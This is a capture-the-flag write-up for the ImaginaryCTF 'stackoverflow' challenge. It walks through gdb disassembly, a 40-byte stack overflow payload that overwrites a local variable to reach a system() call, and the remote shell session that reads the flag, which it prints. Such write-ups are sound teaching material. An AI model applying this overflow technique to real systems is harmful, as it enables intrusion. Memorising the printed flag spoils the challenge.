# stackoverflow  50 points

# Description

Welcome to Stack Overflow! Get answers to all your programming questions right here!

```nc chal.imaginaryctf.org 42001```


# Attachments

https://imaginaryctf.org/r/E795-stackoverflow (If link is down, the executable is included in this directory)

# Solution

Let's make the program executable and run it locally fist.

```bash
./stackoverflow
Welcome to StackOverf..
AAAAa
Thanks! Now onto the posts!
ERROR: FEATURE NOT IMPLEMENTED YET
```

The program prints welcome message,get input from the user,print 'FEATURE NOT IMPLEMENTED YET' and exit.Nothing interesting.

But if we give long input, we can see the **Segmentation fault (core dumped)**.

```bash
./stackoverflow
Welcome to StackOverf..
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thanks! Now onto the posts!
ERROR: FEATURE NOT IMPLEMENTED YET
Segmentation fault (core dumped)
```

So there must be a buffer overflow vulnerability in this program.Let's run this program in **gdb** to disassemble and analyse the program more.

I will not show the whole gdb result.Only interesting parts will be shown.And also, I am using intel syntax with (set disassembly-flavor intel)

```
0x00005555555547c2 <+8>:	mov    QWORD PTR [rbp-0x8],0x42424242
```
This tells us that there is **0x42424242** (which is BBBB in hex format) at **rbp-0x8**

```
0x0000555555554812 <+88>:	lea    rax,[rbp-0x30]
0x0000555555554816 <+92>:	mov    rsi,rax
0x0000555555554819 <+95>:	lea    rdi,[rip+0x183]
0x0000555555554820 <+102>:	mov    eax,0x0
0x0000555555554825 <+107>:	call   0x555555554690 <__isoc99_scanf@plt>
```
The program is using **scanf** to get our input and the addreass of our input starts from **rbp-0x30**.Because **rsi** is the first argument of the **scanf** function.
```
0x0000555555554836 <+124>:	cmp    QWORD PTR [rbp-0x8],0x69637466
0x000055555555483e <+132>:	jne    0x55555555485f <main+165>
...
0x0000555555554858 <+158>:	call   0x555555554670 <system@plt>
```
This part tells us that the program compare **rbp-0x8** with 0x69637466 (wich is **ictf** in hex format).If not equals it will jump to 0x55555555485f which will print the "FEATURE NOT IMPLEMENTED YET" message.If it is equal, it will and follow and arrive to call **system** instruction.

System is a C function that creates a child process which executes the given argument as a shell command.It must be our goal in this challenge.

After reading the assembly, we knew that we must change the **rbp-0x8** which is 0x42424242 ("BBBB") into 0x69637466 ("ictf") to get to system function.And, we already knew that there is a buffer overflow vulnerability in this program.So, all we have to do is overflow and change the **rbp-0x8**.

The address of our input is at **rbp-0x30** which we knew from reading assembly.So, the stack may looks like this
```
(our input)rbp-0x30               -> |  AAAAA  |
...                                  |  AA.... |
...                                  |  ...... |
(target we want to change)rbp-0x8 -> |  BBBB   |
```
The *0x30* in decimal is *48* and *0x8*  in decimal is *8*.The distance from our input address to target is *48 - 8 = 40*.So, we have to write 40 bytes first and the write "ictf".

So , our payload may look like this
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAictf
```
Let's try that
```
Welcome to StackOverf..
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAictf
Thanks! Now onto the posts!
ERROR: FEATURE NOT IMPLEMENTED YET
```
Hmm... nothing?Let's try again that in gdb.But I make a break point at compare instruction (b * main + 124) to see what the rbp-0x8 is changed into.
```
Welcome to StackOverf..
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAictf
Thanks! Now onto the posts!

Breakpoint 1, 0x0000555555554836 in main ()
(gdb) x/x $rbp-0x8
0x7fffffffde68:	0x66746369
```
Aha.. .It's endianess.The *ictf* becomes *0x66746369 ("ftci")* because we use **little endianess**.So, we have to change *ictf* to *ftci*

Let's try that
```
nc chal.imaginaryctf.org 42001
Welcome to StackOverf..
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAftci
Thanks! Now onto the posts!
DEBUG MODE ACTIVATED.
ls
flag.txt
run
cat flag.txt
ictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa}
```
And, there is the flag
```
ictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa}
```
